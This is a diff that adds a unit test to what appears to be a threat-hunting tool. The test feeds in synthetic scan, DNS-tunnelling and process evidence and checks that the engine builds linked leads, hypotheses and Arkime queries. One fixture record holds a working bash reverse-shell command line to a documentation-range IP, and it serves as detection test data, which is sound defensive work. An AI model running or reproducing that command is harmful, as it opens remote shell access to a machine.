@@ -343,5 +343,134 @@ class CandidateFrontierTests(unittest.TestCase):
         self.assertEqual(first_ids | second_ids | third_ids, {item["candidate_id"] for item in candidates})
 
 
+class AttackDiscoveryWorkflowTests(unittest.TestCase):
+    def test_generic_multi_behavior_fixture_reaches_diverse_entity_scoped_frontier(self):
+        import tempfile
+        import time
+        from dataclasses import replace
+        from pathlib import Path
+
+        from romulus.config import Settings
+        from romulus.investigation.workflow import HuntEngine
+        from romulus.store import Store
+
+        network = []
+        for scanner_index in range(8):
+            source = f"10.80.0.{scanner_index + 10}"
+            for target_index in range(4):
+                network.append({
+                    "evidence_id": f"EV-SCAN-{scanner_index}-{target_index}",
+                    "source": "arkime",
+                    "observed_at": f"2026-09-02T10:{scanner_index:02d}:{target_index:02d}Z",
+                    "asset": source,
+                    "observation": "Synthetic connection observation",
+                    "raw": {
+                        "source": {"ip": source},
+                        "destination": {"ip": f"198.51.100.{target_index + 10}", "port": 8000 + target_index},
+                        "network": {"protocol": "tcp"},
+                    },
+                })
+        network.append({
+            "evidence_id": "EV-DNS-BEHAVIOR",
+            "source": "arkime",
+            "observed_at": "2026-09-02T10:20:00Z",
+            "asset": "10.90.0.27",
+            "observation": "Synthetic DNS observation",
+            "raw": {
+                "source": {"ip": "10.90.0.27"},
+                "destination": {"ip": "203.0.113.53", "port": 53},
+                "network": {"protocol": "dns"},
+                "dns": {"question": {"name": "abcdefghijklmnopqrstuvwxyz012345.example.test"}},
+            },
+        })
+        host = [{
+            "evidence_id": "EV-EXEC-BEHAVIOR",
+            "source": "elasticsearch",
+            "observed_at": "2026-09-02T10:15:00Z",
+            "asset": "node-27.example.test",
+            "observation": "Synthetic process observation",
+            "raw": {
+                "host": {"name": "node-27.example.test", "ip": "10.90.0.27"},
+                "process": {"command_line": "bash -i >& /dev/tcp/192.0.2.44/9443 0>&1"},
+            },
+        }]
+
+        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
+            root = Path(directory)
+            settings = replace(
+                Settings.from_env(),
+                home=root,
+                data_dir=root / "data",
+                logs_dir=root / "logs",
+                reports_dir=root / "reports",
+                arkime_url="http://arkime.example.test:8005",
+                arkime_username="test-user",
+                arkime_password="test-password",
+                pcap_files=(),
+                historical_search=True,
+            )
+            engine = HuntEngine(settings, Store(settings.data_dir, settings.logs_dir), offline=False, use_ollama=False)
+            state = {
+                "hunt_id": "HUNT-GENERIC-DISCOVERY",
+                "objective": "Hunt broadly for evidence-backed suspicious behavior.",
+                "mission_mode": "undirected",
+                "host": host,
+                "network": network,
+                "evidence": [],
+                "findings": [],
+                "hypotheses": [],
+                "candidate_leads": [],
+                "lead_catalog": [],
+                "completed_leads": [],
+                "pivot_results": [],
+                "queries": [],
+                "coverage": {},
+                "source_health": {"host": True, "network": True},
+                "reasoning_history": [],
+                "stage_history": [],
+                "tool_runs": [],
+                "source_errors": [],
+                "tool_calls": 0,
+                "started_epoch": time.time(),
+            }
+
+            result = engine._analyze(state)
+
+        candidates_by_analytic = {
+            item.get("analytic_id"): item for item in result["candidate_leads"] if item.get("analytic_id")
+        }
+        represented = {
+            candidate_id for hypothesis in result["hypotheses"]
+            for candidate_id in hypothesis.get("basis_candidate_ids", [])
+        }
+        dns_candidate = candidates_by_analytic["BH-NET-004"]
+        execution_candidate = candidates_by_analytic["BH-LNX-016"]
+        scan_candidates = [
+            item for item in result["candidate_leads"] if item.get("analytic_id") == "BH-NET-001"
+        ]
+
+        self.assertTrue(result["hypotheses"])
+        self.assertTrue(all(hypothesis.get("basis_candidate_ids") for hypothesis in result["hypotheses"]))
+        self.assertIn(dns_candidate["candidate_id"], represented)
+        self.assertLessEqual(sum(item["candidate_id"] in represented for item in scan_candidates), 2)
+        self.assertTrue(any(
+            relation["candidate_id"] == execution_candidate["candidate_id"]
+            and relation["evidence_ids"] == ["EV-DNS-BEHAVIOR", "EV-EXEC-BEHAVIOR"]
+            for relation in dns_candidate["related_candidates"]
+        ))
+
+        represented_scan = next(item for item in scan_candidates if item["candidate_id"] in represented)
+        scan_task = next(
+            task for task in result["search_tasks"].values()
+            if represented_scan["candidate_id"] in task.get("candidate_ids", [])
+            and task.get("source") == "arkime"
+        )
+        expression = scan_task["query_spec"]["expression"]
+        self.assertIn(represented_scan["assets"][0], expression)
+        self.assertIn("protocols == tcp", expression)
+        self.assertIn("protocols == udp", expression)
+        self.assertEqual(result["findings"], [])
+
+
 if __name__ == "__main__":
     unittest.main()
